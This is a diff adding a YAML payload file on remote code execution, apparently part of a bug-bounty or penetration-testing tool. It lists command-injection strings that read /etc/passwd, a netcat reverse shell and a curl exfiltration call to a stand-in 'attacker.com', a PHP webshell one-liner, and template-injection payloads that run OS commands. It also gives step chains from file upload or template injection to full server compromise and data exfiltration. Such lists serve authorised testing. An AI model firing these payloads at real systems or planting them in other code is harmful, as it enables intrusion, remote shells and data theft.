@@ -1,0 +1,115 @@
+name: Remote Code Execution (RCE)
+description: >
+  RCE allows an attacker to execute arbitrary code or commands on a target
+  server, often the highest-severity vulnerability class.
+
+basic_payloads:
+  - "| cat /etc/passwd"
+  - "; cat /etc/passwd"
+  - "`cat /etc/passwd`"
+  - "$(cat /etc/passwd)"
+  - "|| cat /etc/passwd"
+  - "& cat /etc/passwd &"
+  - "| ping -c 5 attacker.com"
+  - "; nc -e /bin/sh attacker.com 4444"
+  - "{{7*7}}"
+  - "#{7*7}"
+  - "${7*7}"
+  - "<%= 7*7 %>"
+  - "{{ config }}"
+
+bypass_techniques:
+  - name: Command Chaining
+    description: Chain multiple commands using shell operators
+    payloads:
+      - "| whoami"
+      - "; id"
+      - "`uname -a`"
+      - "$(hostname)"
+      - "|| ping -c 1 127.0.0.1"
+      - "& whoami &"
+
+  - name: Blind RCE Detection
+    description: Use time-based or out-of-band detection for blind RCE
+    payloads:
+      - "| sleep 5"
+      - "; ping -c 10 127.0.0.1"
+      - "| nslookup attacker.com"
+      - "$(curl http://attacker.com/$(whoami))"
+
+  - name: Deserialization Exploits
+    description: Exploit insecure deserialization in various formats
+    payloads:
+      - "Java: yoserial payloads"
+      - "PHP: serialize/unserialize gadgets"
+      - "Python: pickle __reduce__"
+      - "Ruby: marshal.load"
+      - ".NET: ViewState deserialization"
+
+  - name: File Upload RCE
+    description: Upload malicious files to achieve code execution
+    payloads:
+      - "webshell.php: <?php system($_GET['cmd']);?>"
+      - ".htaccess: AddType application/x-httpd-php .txt"
+      - "Web.config: ASP.NET code execution"
+      - "Polyglot images with embedded PHP"
+
+  - name: SSTI Exploitation
+    description: Exploit server-side template injection for RCE
+    payloads:
+      - "Jinja2: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
+      - "Twig: {{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}"
+      - "Freemarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
+      - "Velocity: #set($e=$class.inspect('java.lang.Runtime').getRuntime().exec('id'))"
+
+detection_patterns:
+  - "command injection"
+  - "rce"
+  - "remote code execution"
+  - "os command"
+  - "shell"
+  - "deserialization"
+  - "template injection"
+  - "ssti"
+  - "eval"
+  - "exec"
+  - "popen"
+  - "subprocess"
+  - "runtime.exec"
+
+chain_templates:
+  - name: File Upload -> Webshell -> Full Compromise
+    description: Upload webshell via file upload functionality and execute commands
+    requirements: [file_upload, executable_directory]
+    steps:
+      - Upload PHP/JSP/ASP webshell
+      - Locate uploaded file path
+      - Access webshell to execute commands
+      - Escalate to full server compromise
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: SSTI -> RCE -> Data Exfil
+    description: Escalate template injection to full RCE and data exfiltration
+    requirements: [ssti, template_engine]
+    steps:
+      - Confirm template injection with math expression
+      - Access OS-level objects via template engine internals
+      - Execute system commands
+      - Exfiltrate sensitive data
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: Deserialization -> RCE Chain
+    description: Exploit insecure deserialization for unauthenticated RCE
+    requirements: [deserialization, known_gadget_chain]
+    steps:
+      - Identify deserialization endpoint
+      - Determine gadget chain availability
+      - Craft malicious serialized object
+      - Trigger deserialization to execute code
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+h1_references:
+  - report_id: "XXXXX"
+    title: "RCE via insecure deserialization"
+    technique: "Java deserialization with CommonsCollections"
+    severity: "critical"
